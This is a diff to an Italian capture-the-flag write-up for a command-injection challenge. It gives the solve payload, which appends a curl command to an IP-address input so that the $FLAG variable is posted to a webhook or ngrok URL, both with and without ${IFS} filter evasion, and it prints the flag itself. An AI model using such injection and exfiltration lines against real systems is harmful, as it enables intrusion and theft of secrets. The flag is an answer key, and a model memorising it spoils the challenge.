@@ -7,8 +7,11 @@ RCE
 La challenge permette di inserire un input che verrà poi fatto eseguire da una shell linux, non essendoci un output dovremo quindi inviarci il risultato del comando tramite `curl` o `wget`:
 
 solve:
-`8.8.8.8;curl${IFS}-s${IFS}-X${IFS}POST${IFS}--data${IFS}"$FLAG"${IFS}"<url di webhook.sit | url di ngrok>"`
+`8.8.8.8;curl -X POST --data "$FLAG" "<url di webhook.sit | url di ngrok>"`
 ## Flag
 `CodeVinciCTF{4lw4ys_ch3ck_inputs}`
+## Requirements
+librerie: flask
+flag in $FLAG
 ## Autore
 @gioppy.
